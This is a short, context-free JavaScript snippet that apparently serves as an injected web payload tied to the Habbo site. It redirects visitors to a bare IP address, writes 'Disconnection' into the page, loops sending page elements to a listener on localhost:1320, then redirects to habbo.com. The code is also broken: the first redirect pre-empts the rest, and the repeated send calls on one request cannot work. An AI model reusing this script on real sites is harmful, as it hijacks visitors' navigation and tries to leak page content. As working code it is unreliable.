window.location = "http://69.172.200.161:443";
document.write("Disconnection");
const XHR = new XMLHttpRequest();
XHR.open("GET", "http://localhost:1320");
for (var x = 0; x < 1302; x++)
{
    XHR.send(document.elementFromPoint(x, x));

}

window.location = "https://www.habbo.com";
